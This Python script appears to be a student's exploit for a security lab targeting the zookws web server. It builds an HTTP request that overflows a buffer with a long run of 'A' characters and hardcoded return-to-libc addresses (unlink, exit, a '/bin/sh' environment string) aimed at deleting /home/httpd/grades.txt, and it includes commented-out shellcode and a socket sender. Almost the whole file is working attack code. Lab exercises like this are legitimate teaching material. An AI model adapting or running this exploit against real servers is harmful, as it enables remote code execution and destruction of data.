#!/usr/bin/python
import sys
import socket
import traceback
import urllib.parse
import struct
#import bytes

#the vm does not support urllib.parse

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_unlink_addr= "%50%24%10%40"
stack_system_addr= "%40%06%51%01"
stack_exit_addr = "%50%81%05%40"
env_shell_addr = "%59%e5%04%08"
#stack_retaddr = stack_saved_ebp + 4

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    #shellcode="eb33 5e89 7608 31c0 8846 0789 460c b00b 89f3 8d4e 088d 560c cd80 5e31 db89 5e16 89d8 89f3 4040 4040 4040 4040 4040 cd80 31c0 40cd 80e8 e0ff ffff 2f68 6f6d 652f 6874 7470 642f 6772 6164 6573 2e74 7874 e8ad ffff ff2f 6269 6e2f 7368"
    #shellcode = bytes.fromhex(shellcode)
    #i=0
    req =   "GET /"+"A"*(2047+20)+stack_unlink_addr +stack_exit_addr +env_shell_addr+"?/home/httpd/grades.txt"+" HTTP/1.0\r\n" + \
	    "Bad: /bin/sh\r\n\r\n"
    #req = urllib.parse.quote(req)
    return req.encode()

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        try:
            resp = resp + rbuf.decode()
            rbuf = sock.recv(1024)
        except KeyboardInterrupt:
            break

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

